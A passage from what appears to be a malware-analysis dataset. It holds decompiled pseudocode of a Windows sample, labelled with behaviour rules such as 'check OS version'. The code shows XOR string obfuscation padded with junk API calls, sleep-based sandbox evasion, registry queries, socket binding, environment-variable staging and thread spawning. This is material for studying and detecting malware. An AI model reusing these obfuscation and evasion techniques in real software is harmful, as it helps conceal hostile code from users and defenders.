iStack1192;\n    uint uStack1172;\n    uchar *puStack1168;\n    uchar auStack1160 [4];\n    int32_t iStack1156;\n    uchar auStack1148 [8];\n    uint uStack1140;\n    int16_t iStack1136;\n    uchar auStack1134 [22];\n    uchar auStack1112 [4];\n    uchar auStack1108 [40];\n    uchar auStack1068 [36];\n    uchar auStack1032 [1028];\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uStack1140 = 0x200;\n    uStack1304 = 0x14202a1b;\n    puVar10 = &stack0xfffffbf8;\n    for (iVar8 = 0x400; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    uStack1300 = 0x7d433d36;\n    puVar10 = &stack0xfffffb90;\n    for (iVar8 = 0x40; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    uStack1340 = 0xe;\n    uStack1296 = 0x3d3f1e7c;\n    puVar10 = &stack0xfffffbd4;\n    for (iVar8 = 0x24; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    iStack1344 = 8;\n    uStack1292 = CONCAT31(uStack1292._1_3_, 0x70);\n    uStack1316 = CONCAT22(uStack1316._2_2_, 0x5153);\n    uStack1348 = 0x40216f;\n    uStack1348 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    uStack1352 = 0x402176;\n    iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    iStack1276 = 6;\n    uStack1264 = 0;\n    iVar11 = 0;\n    puStack1268 = &stack0xfffffadc + -iVar8;\n    iStack1156 = iVar8;\n    do {\n        uStack1352 = 0x40219f;\n        iVar3 = (*_sym.imp.USER32.dll_GetMessagePos)();\n        if (iVar3 != 0x3e5189) {\n            *(iVar11 + iVar8) = (&stack0xfffffacc)[iVar11 % iStack1276] ^ (iVar11 + iVar8)[puStack1268];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0xd);\n    uStack1352 = 0x15;\n    uStack1356 = 8;\n    uStack1316 = 0x19432a21;\n    uStack1312 = 0x390f0e54;\n    uStack1308 = 0x94c0452;\n    uStack1304 = 0x1e5a2a12;\n    uStack1300 = 0x4f091c5b;\n    iVar8 = CONCAT22(unaff_EBX >> 0x10, 0x7a35);\n    uStack1360 = 0x402200;\n    uStack1360 = (*pcVar2)();\n    iStack1364 = 0x402207;\n    iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    iVar3 = 0;\n    puStack1284 = &stack0xfffffad0 + -iVar11;\n    iStack1280 = iVar11;\n    do {\n        iStack1364 = 0x402221;\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n        if (iVar4 != 0xab823c) {\n            *(iVar3 + iVar11) = (&stack0xfffffac0)[iVar3 % iStack1288] ^ (iVar3 + iVar11)[puStack1284];\n        }\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x14);\n    puStack1368 = puStack1168;\n    uStack1372 = 0x402254;\n    iStack1364 = iVar11;\n    uStack1372 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n    uStack1376 = 0x40225b;\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    uStack1172 = 0x40;\n    uStack1376 = &stack0xfffffb6c;\n    puStack1380 = 0x402276;\n    (*_sym.imp.KERNEL32.dll_GlobalMemoryStatusEx)();\n    puStack1380 = &stack0xfffffbac;\n    if (pcVar5 == NULL) {\n        uStack1384 = 0x40228c;\n        (*_sym.imp.KERNEL32.dll_GetSystemInfo)();\n    }\n    else {\n        uStack1384 = 0x402284;\n        (*pcVar5)();\n    }\n    uStack1384 = 0xbd;\n    uStack1388 = 8;\n    uStack1292 = 0x7823567b;\n    iStack1288 = 0x5657351e;\n    puStack1284 = 0x350d7835;\n    iStack1280 = 0x78275641;\n    iStack1276 = 0x56773530;\n    uStack1272 = 0x353f7807;\n    puStack1268 = 0x78105670;\n    uStack1264 = 0x56633525;\n    uStack1260 = 0x35257816;\n    uStack1256 = 0x780c567c;\n    uStack1252 = 0x56603530;\n    uStack1248 = 0x351f783b;\n    uStack1244 = 0x78275647;\n    uStack1240 = 0x566f3501;\n    uStack1236 = 0x35097801;\n    puStack1232 = 0x7836565d;\n    uStack1228 = 0x5652351e;\n    uStack1224 = 0x353c782e;\n    uStack1220 = 0x782d5641;\n    uStack1216 = 0x5656350f;\n    uStack1212 = 0x351f7831;\n    puStack1208 = 0x7830565c;\n    uStack1204 = 0x56033530;\n    uStack1200 = 0x7842;\n    iStack1364 = 0x78425633;\n    uStack1360 = CONCAT22(uStack1360._2_2_, 0x356c);\n    uStack1392 = 0x402393;\n    uStack1392 = (*pcVar2)();\n    puStack1396 = 0x40239a;\n    iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    iVar3 = 0;\n    uStack1316 = iVar11;\n    puStack1208 = &stack0xfffffae8 + -iVar11;\n    do {\n        puStack1396 = 0x4023b9;\n        iVar4 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n        if (iVar4 != 0xcbf721) {\n            *(iVar3 + iVar11) = (&stack0xfffffaa0)[iVar3 % 0x7a524f70] ^ (iVar3 + iVar11)[&stack0xfffffae8 + -iVar11];\n        }\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x5e);\n    puStack1396 = &stack0xfffffb4c;\n    pcStack1404 = reloc.WS2_32.dll_bind;\n    iStack1408 = 0x4023ed;\n    uStack1400 = iVar11;\n    iVar3 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyW)();\n    iStack1408 = iVar11;\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    if (iVar3 == 0) {\n        iStack1408 = 0x51;\n        uStack1412 = 8;\n        uStack1372 = 0x330a6f62;\n        puStack1368 = 0x6f51410b;\n        iStack1364 = 0x4117331d;\n        uStack1360 = 0x33176f41;\n        uStack1356 = 0x6f7c4116;\n        uStack1352 = 0x41093319;\n        uStack1348 = 0x332b6f57;\n        iStack1344 = 0x6f404110;\n        uStack1340 = 0x410a3311;\n        puStack1380 = 0x33786f32;\n        uStack1376 = CONCAT22(uStack1376._2_2_, 0x4164);\n        uStack1416 = 0x402468;\n        uStack1416 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n        puStack1420 = 0x40246f;\n        iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n        iVar3 = 0;\n        uStack1400 = iVar11;\n        puStack1232 = &stack0xfffffa98 + -iVar11;\n        do {\n            puStack1420 = 0x40248e;\n            iVar4 = (*_sym.imp.USER32.dll_GetShellWindow)();\n            if (iVar4 != 0x466828) {\n                *(iVar3 + iVar11) =\n                     (&stack0xfffffa90)[iVar3 % iStack1344] ^ (iVar3 + iVar11)[&stack0xfffffa98 + -iVar11];\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < 0x28);\n        puStack1420 = &stack0xfffffb3c;\n        puStack1424 = &stack0xfffffba8;\n        uStack1428 = 0;\n        (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(uStack1228, iVar11, 0);\n        piVar9 = &stack0xfffffb90;\n        do {\n            iVar1 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar1 != uStack1356);\n        pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n        if (piVar9 - &stack0xfffffb92 >> 1 != 0) {\n            iVar11 = 0x15;\n            iStack1408 = 0x75336532;\n            pcStack1404 = 0x65044239;\n            uStack1400 = CONCAT22(uStack1400._2_2_, 0x7556);\n            uStack1416 = 0x7556656a;\n            uStack1412 = CONCAT22(uStack1412._2_2_, 0x4256);\n            uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n            iVar4 = 0;\n            puStack1368 = &stack0xfffffa74 + -iVar3;\n            do {\n                iVar7 = (*_sym.imp.USER32.dll_CreateMenu)();\n                if (iVar7 != 0x961498) {\n                    *(iVar4 + iVar3) =\n                         (&stack0xfffffa6c)[iVar4 % puStack1380] ^ (iVar4 + iVar3)[&stack0xfffffa74 + -iVar3];\n                }\n                pcVar2 = _sym.imp.SHLWAPI.dll_StrStrIW;\n                iVar4 = iVar4 + 1;\n            } while (iVar4 < 10);\n            iVar4 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(&stack0xfffffb84, iVar3);\n            while (iVar4 != 0) {\n                (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n                iVar4 = (*pcVar2)(&stack0xfffffb78, iVar3);\n            }\n            uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n            pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n        }\n        iVar3 = iStack1364;\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(uStack1252);\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar11);\n        (*pcVar5)(uVar6);\n        iStack1408 = iVar3;\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    }\n    while ((_sym.imp.KERNEL32.dll_GetProcessHeap = pcVar2,  iStack1192 == 0 && (uStack1196 < 2100000000))) {\n        iStack1408 = 10000;\n        uStack1412 = 0x4025f5;\n        (*_sym.imp.KERNEL32.dll_Sleep)();\n        iStack1408 = iVar8;\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    }\n    uStack1412 = 0;\n    uStack1416 = 0x40261b;\n    uStack1416 = (*pcVar2)();\n    puStack1420 = 0x40261e;\n    (*pcVar5)();\n    puStack1424 = NULL;\n    uStack1428 = 0x402624;\n    uStack1428 = (*pcVar2)();\n    (*pcVar5)();\n    uVar6 = (*pcVar2)(0, uStack1236);\n    (*pcVar5)(uVar6);\n    return;\n}\n",
        "token_count": 3642
    },
    "00402662": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nuint32_t fcn.00402662(void)\n\n{\n    ushort uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint uStack488;\n    uint uStack484;\n    uint uStack480;\n    uchar *puStack476;\n    uint32_t uVar8;\n    uchar auStack408 [404];\n    \n    puStack476 = &stack0xfffffe68;\n    uVar7 = 0;\n    uStack480 = 0x202;\n    uStack484 = 0x402683;\n    (*_sym.imp.WS2_32.dll_WSAStartup)();\n    uStack484 = 0;\n    uStack488 = 1;\n    uVar2 = (*_sym.imp.WS2_32.dll_socket)(2);\n    if (uVar2 != 0xffffffff) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        uVar7 = iVar3 + 2000U & 0xffff;\n        uVar2 = 0;\n        if (uVar7 < 64000) {\n            uVar8 = 0x4948655c;\n            puStack476 = 0x72786778;\n            do {\n                uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n                iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n                iVar6 = 0;\n                uVar7 = uVar8;\n                do {\n                    iVar5 = (*_sym.imp.USER32.dll_GetMessageTime)();\n                    if (iVar5 != 0xe8d25a) {\n                        *(iVar6 + iVar3) = (&stack0xfffffe18)[iVar6 % 6] ^ (iVar6 + iVar3)[&stack0xfffffe20 + -iVar3];\n                    }\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < 10);\n                (*_sym.imp.WS2_32.dll_inet_addr)(iVar3);\n                uVar1 = (*_sym.imp.WS2_32.dll_ntohs)(uVar7);\n                uVar8 = CONCAT22(uVar1, 2);\n                iVar6 = (*_sym.imp.WS2_32.dll_bind)(0x7249, &stack0xfffffe30, 0x10);\n                if (iVar6 == 0) {\n                    (*_sym.imp.WS2_32.dll_closesocket)(0x7249);\n                    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                    uVar2 = (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                    break;\n                }\n                uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                uVar7 = uVar7 + 1;\n                uVar2 = 0;\n            } while (uVar7 < 64000);\n        }\n    }\n    return uVar2 & 0xffff0000 | uVar7 & 0xffff;\n}\n",
        "token_count": 706
    },
    "004027b3": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004027b3(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    code *pcVar6;\n    uchar *puVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    uint var_354h;\n    uint var_14ch;\n    uint var_10ch;\n    uint var_cch;\n    uint var_c0h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    int32_t var_58h;\n    int32_t var_54h;\n    int32_t var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    uint var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    uint32_t var_34h;\n    uchar var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uchar uStack20;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_b0h = 0x208;\n    iVar2 = fcn.00401ebc();\n    if (iVar2 == 0) {\n        fcn.004020f5();\n        fcn.00404b59();\n        while ((iVar2 = fcn.004058aa(),  iVar2 != 0 || (iVar2 = fcn.00405914(),  iVar2 != 0))) {\n            (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n        }\n    }\n    pcVar6 = _sym.imp.KERNEL32.dll_VirtualProtect;\n    iVar2 = (*_sym.imp.KERNEL32.dll_VirtualProtect)(str.DG_X, 0x184, 0x40, &var_a0h);\n    if (iVar2 != 0) {\n        fcn.0040f4e0();\n        (*pcVar6)(str.DG_X, 0x184, var_a0h, &var_a0h);\n    }\n    puVar7 = 0x41dad0;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    fcn.0040b4dd();\n    puVar9 = &var_cch;\n    for (iVar2 = 0x1c; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    puVar9 = &var_ach;\n    for (iVar2 = 0xc; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    puVar7 = 0x41daa8;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar9 = &var_354h;\n    for (iVar2 = 0x208; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    iVar2 = (*_sym.imp.ADVAPI32.dll_GetUserNameW)(&var_354h, &var_b0h);\n    var_38h = 6;\n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar2 != 0) {\n        var_24h._0_2_ = 0x630c;\n        var_24h._2_1_ = 0x12;\n        var_24h._3_1_ = 0x70;\n        var_20h._0_1_ = 6;\n        var_20h._1_2_ = 0xb55;\n        var_20h._3_1_ = 99;\n        var_1ch._0_1_ = 0xf;\n        var_1ch._1_2_ = 0x270;\n        var_1ch._3_1_ = 0x55;\n        var_18h._0_1_ = 0x14;\n        var_18h._1_1_ = 99;\n        var_18h._2_1_ = 4;\n        var_18h._3_1_ = 0x70;\n        var_14h._0_1_ = 0x43;\n        var_14h._1_1_ = 0x55;\n        var_8h = 0x70416359;\n        var_4h._0_2_ = 0x5543;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar8 = 0;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_GetInputState)();\n            if (iVar4 != 0xdca5c1) {\n                *(iVar8 + iVar2) = *(&var_8h + iVar8 % var_38h) ^ (iVar8 + iVar2)[&var_24h - iVar2];\n            }\n            iVar8 = iVar8 + 1;\n        } while (iVar8 < 0x12);\n        (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableW)(iVar2, &var_354h);\n        pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    iVar2 = fcn.0040ef18();\n    if (iVar2 != 0) {\n        if (2 < var_cch._1_1_) {\n            iVar2 = 0;\n            if (0 < var_cch._1_1_ - 2) {\n                do {\n                    *0x41dab0 = *0x41dab0 + (&var_c0h)[iVar2];\n                    iVar2 = iVar2 + 1;\n                } while (iVar2 < var_cch._1_1_ - 2);\n            }\n        }\n        *0x41dab0 = *0x41dab0 ^ 0x43103655;\n        iVar2 = fcn.00401fa0();\n        if (iVar2 != 0) {\n            if (*0x41dd70 < 6) {\n                var_9ch = 0x2d7c562b;\n                var_98h = 0x2f261c5a;\n                var_94h = 0x1226521d;\n                var_90h = 0x2b6f5754;\n                var_8ch = 0x28477a26;\n                var_88h = 0x1028266f;\n                var_84h = 0x28135726;\n                var_80h = 0x2d54685a;\n                var_7ch = 0x1249401a;\n                var_78h = 0x2a1d2354;\n                var_74h = 0x2d286828;\n                var_70h = 0x125a526f;\n                var_6ch = 0x287c453a;\n                var_68h = 0x2f261c5a;\n                var_64h = 0x1226521d;\n                var_60h = 0x2b6f5754;\n                var_5ch._0_2_ = 0x7a20;\n                var_5ch._2_1_ = 0x6f;\n                var_8h = 0x69546c6f;\n                var_4h._0_2_ = 0x5361;\n                uVar3 = (*pcVar6)(8, 0x44);\n                iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                iVar8 = 0;\n                var_40h = &var_9ch - iVar2;\n                do {\n                    iVar4 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n                    if (iVar4 != 0xea88e5) {\n                        *(iVar8 + iVar2) = *(&var_8h + iVar8 % var_38h) ^ (iVar8 + iVar2)[var_40h];\n                    }\n                    iVar8 = iVar8 + 1;\n                } while (iVar8 < 0x43);\n            }\n            else {\n                var_20h._0_1_ = 0x3b;\n                var_20h._1_2_ = 0x6f51;\n                var_20h._3_1_ = 0x17;\n                var_1ch._0_1_ = 0x79;\n                var_1ch._1_2_ = 0x5354;\n                var_1ch._3_1_ = 0x25;\n                var_18h._0_1_ = 0x10;\n                var_18h._1_1_ = 0x61;\n                var_18h._2_1_ = 0xe;\n                var_18h._3_1_ = 0x54;\n                var_14h._0_1_ = 0x24;\n                var_14h._1_1_ = 0x3c;\n                var_14h._2_1_ = 0x6e;\n                var_14h._3_1_ = 0x5a;\n                var_8h = 0x5a476b68;\n                var_4h._0_2_ = 0x6f35;\n                uVar3 = (*pcVar6)(8, 0x11);\n                iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                iVar8 = 0;\n                var_40h = &var_20h - iVar2;\n                do {\n                    iVar4 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n                    if (iVar4 != 0x124bd5) {\n                        *(iVar8 + iVar2) = *(&var_8h + iVar8 % var_38h) ^ (iVar8 + iVar2)[var_40h];\n                    }\n                    iVar8 = iVar8 + 1;\n                } while (iVar8 < 0x10);\n            }\n            var_ach = 0xc;\n            var_a4h = 0;\n            var_a8h = 0;\n            (*_sym.imp.ADVAPI32.dll_ConvertStringSecurityDescriptorToSecurityDescriptorA)(iVar2, 1, &var_a8h, 0);\n            uVar3 = (*pcVar6)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n    }\n    *0x41dab8 = fcn.00402662();\n    *0x41dab8 = *0x41dab8 & 0xffff;\n    var_20h._0_1_ = 0x5c;\n    var_20h._1_2_ = 0x5135;\n    var_20h._3_1_ = 0x37;\n    var_1ch._0_1_ = 0x3c;\n    var_1ch._1_2_ = 0x510b;\n    var_1ch._3_1_ = 0x28;\n    var_18h._0_1_ = 0x50;\n    var_18h._1_1_ = 0x1d;\n    var_18h._2_1_ = 0x23;\n    var_18h._3_1_ = 0xd;\n    var_14h._0_1_ = 0x4b;\n    var_14h._1_1_ = 0x4d;\n    var_8h = 0x68344d39;\n    var_4h._0_2_ = 0x684f;\n    uVar3 = (*pcVar6)(8, 0xf);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_58h = &var_20h - iVar2;\n    var_40h = iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n        if (iVar4 != 0x574f18) {\n            *(iVar8 + iVar2) = *(&var_8h + iVar8 % var_38h) ^ (iVar8 + iVar2)[var_58h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0xe);\n    var_20h._0_1_ = 0x15;\n    var_20h._1_2_ = 0x3541;\n    var_20h._3_1_ = 3;\n    var_1ch._0_1_ = 0x23;\n    var_1ch._1_2_ = 0x5907;\n    var_1ch._3_1_ = 0x3b;\n    var_18h._0_1_ = 3;\n    var_18h._1_1_ = 0x22;\n    var_18h._2_1_ = 0xb;\n    var_18h._3_1_ = 0x41;\n    var_14h._0_1_ = 0x39;\n    var_14h._1_1_ = 0x6d;\n    var_50h = 0x6d543566;\n    var_4ch._0_1_ = 0x47;\n    uVar3 = (*pcVar6)(8, 0xf);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_34h = 0;\n    var_3ch = &var_20h - iVar2;\n    var_38h = 5;\n    var_58h = iVar2;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_CountClipboardFormats)();\n        if (iVar8 != 0xb267fd) {\n            *(var_34h + iVar2) = *(&var_50h + var_34h % var_38h) ^ (var_34h + iVar2)[var_3ch];\n        }\n        var_34h = var_34h + 1;\n    } while (var_34h < 0xe);\n    var_8h = 0x6e184212;\n    var_4h._0_2_ = 0x370e;\n    var_48h = 0x4b473137;\n    var_44h._0_1_ = 0x6a;\n    uVar3 = (*pcVar6)(8, 7);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_3ch = &var_8h - iVar2;\n    var_50h = iVar2;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n        if (iVar4 != 0xdafd07) {\n            *(iVar8 + iVar2) = *(&var_48h + iVar8 % var_38h) ^ (iVar8 + iVar2)[var_3ch];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 6);\n    (*_sym.imp.USER32.dll_wsprintfA)(&var_10ch, iVar2, var_40h, *0x41da50);\n    *0x41dd78 = fcn.0040f376();\n    *0x41dab8 = 6000;\n    var_34h = var_34h & 0xff000000 | 0x662162;\n    var_2ch = 0x68664547;\n    var_28h._0_1_ = 0x6f;\n    uVar3 = (*pcVar6)(8, 4);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_3ch = &var_34h - iVar2;\n    var_48h = iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetFocus)();\n        if (iVar4 != 0x1582db) {\n            *(iVar8 + iVar2) = *(&var_2ch + iVar8 % var_38h) ^ (iVar8 + iVar2)[var_3ch];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 3);\n    (*_sym.imp.USER32.dll_wsprintfA)(&var_14ch, iVar2, *0x41dab8);\n    var_2ch = 0x5d1a0231;\n    var_28h._0_1_ = 0x43;\n    var_34h = 0x386f7045;\n    var_30h = 0x43;\n    uVar3 = (*pcVar6)(8, 6);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_54h = &var_2ch - iVar2;\n    var_3ch = iVar2;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        if (iVar4 != 0xd9d5be) {\n            *(iVar8 + iVar2) = *(&var_34h + iVar8 % var_38h) ^ (iVar8 + iVar2)[var_54h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 5);\n    var_ch = 0x350c104f;\n    var_8h = 0xb2a4b09;\n    var_4h._0_2_ = 0x6635;\n    var_2ch = 0x51627539;\n    var_28h._0_1_ = 0x66;\n    uVar3 = (*pcVar6)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_34h = &var_ch - iVar2;\n    var_54h = iVar2;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar4 != 0x74a734) {\n            *(iVar8 + iVar2) = *(&var_2ch + iVar8 % var_38h) ^ (iVar8 + iVar2)[var_34h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 10);\n    var_24h._0_2_ = 0x320a;\n    var_24h._2_1_ = 5;\n    var_24h._3_1_ = 0x1b;\n    var_20h._0_1_ = 0x41;\n    var_20h._1_2_ = 0x3c15;\n    var_20h._3_1_ = 0xf;\n    var_1ch._0_1_ = 0x10;\n    var_1ch._1_2_ = 0x1442;\n    var_1ch._3_1_ = 0x3c;\n    var_18h._0_1_ = 0x1a;\n    var_18h._1_1_ = 0x10;\n    var_18h._2_1_ = 0x43;\n    var_18h._3_1_ = 0x15;\n    var_14h._0_1_ = 0x3a;\n    var_14h._1_1_ = 8;\n    var_14h._2_1_ = 0x10;\n    var_14h._3_1_ = 0x31;\n    var_8h = 0x756c5367;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x31);\n    uVar3 = (*pcVar6)(8, 0x15);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_2ch = &var_24h - iVar2;\n    var_34h = iVar2;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        if (iVar4 != 0x9f1248) {\n            *(iVar8 + iVar2) = *(&var_8h + iVar8 % var_38h) ^ (iVar8 + iVar2)[var_2ch];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x14);\n    var_24h._0_2_ = 0x3063;\n    var_24h._2_1_ = 4;\n    var_24h._3_1_ = 0x56;\n    var_20h._0_1_ = 0x1b;\n    var_20h._1_2_ = 0x1d5c;\n    var_20h._3_1_ = 3;\n    var_1ch._0_1_ = 0x41;\n    var_1ch._1_2_ = 0x5400;\n    var_1ch._3_1_ = 0x3f;\n    var_18h._0_1_ = 0x3a;\n    var_18h._1_1_ = 0x5d;\n    var_18h._2_1_ = 6;\n    var_18h._3_1_ = 0x45;\n    var_14h._0_1_ = 0x13;\n    var_14h._1_1_ = 0xb;\n    var_14h._2_1_ = 0x41;\n    var_14h._3_1_ = 0x11;\n    uStack20 = 0x31;\n    var_8h = 0x326a5131;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x74);\n    uVar3 = (*pcVar6)(8, 0x16);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_2ch = &var_24h - iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n        if (iVar4 != 0x74783a) {\n            *(iVar8 + iVar2) = *(&var_8h + iVar8 % var_38h) ^ (iVar8 + iVar2)[&var_24h - iVar2];\n        }\n        pcVar6 = _sym.imp.KERNEL32.dll_SetEnvironmentVariableA;\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x15);\n    (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableA)(var_58h, var_3ch);\n    (*pcVar6)(var_54h, &var_10ch);\n    (*pcVar6)(var_34h, 0x41da54);\n    (*pcVar6)(iVar2, &var_14ch);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n    puVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    puVar9 = puVar5;\n    for (iVar8 = 0xc; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    *puVar5 = 0x20;\n    *0x41db24 = (*_sym.imp.KERNEL32.dll_CreateEventA)(0, 0, 0, 0);\n    pcVar6 = _sym.imp.KERNEL32.dll_CreateThread;\n    *0x41dad0 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040e154, puVar5, 0, 0);\n    *0x41dad4 = (*pcVar6)(0, 0, fcn.004045e7, *0x41dd68, 0, 0);\n    *0x41dad8 = (*pcVar6)(0, 0, fcn.0040828a, puVar5, 0, 